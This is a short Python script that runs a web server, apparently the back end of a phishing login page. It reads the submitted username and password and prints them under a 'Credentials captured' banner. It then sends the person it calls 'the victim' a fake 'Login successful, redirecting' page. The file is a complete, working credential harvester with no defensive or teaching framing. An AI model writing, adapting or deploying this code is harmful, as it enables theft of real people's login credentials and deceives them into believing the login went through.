from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class PostHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Respond with a simple dummy page (optional)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body>Login successful (simulated)</body></html>")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed = urllib.parse.parse_qs(post_data)
        
        # Extract username and password (adjust field names if needed)
        username = parsed.get('userName', [''])[0]
        password = parsed.get('password', [''])[0]
        
        print(f"\n[!] Credentials captured:")
        print(f"Username: {username}")
        print(f"Password: {password}\n")
        
        # Send a fake success response back to the victim
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body>Login successful, redirecting...</body></html>")

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), PostHandler)
    print("Listening on port 8000...")
    server.serve_forever()
